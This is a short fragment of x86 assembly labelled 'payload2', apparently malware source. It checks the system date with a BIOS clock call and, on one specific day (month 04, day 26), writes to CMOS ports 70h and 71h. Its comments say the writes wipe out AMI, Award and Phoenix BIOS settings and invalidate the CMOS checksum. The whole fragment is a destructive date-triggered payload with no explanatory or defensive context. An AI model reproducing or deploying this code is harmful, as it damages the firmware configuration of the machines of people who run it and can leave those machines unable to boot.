payload2:
	pusha
	mov ah, 04h
	int 1Ah
	cmp dx, 0000010000100110b
	jne nope2

	; Wipe out AMI and Award BIOS
	mov al, 17h
	out 70h, al
	out 71h, al

	; Wipe out Phoenix BIOS
	mov al, 0FFh
	out 70h, al
	mov al, 17h
	out 71h, al

	; Invalidate the checksum
	; Trash registers 2EH - 2FH
	mov al, 2Eh
	out 70h, al
	xor al, al
	out 71h, al
	mov al, 2Fh
	out 70h, al
	xor al, al
	out 71h, al
nope2:
    popa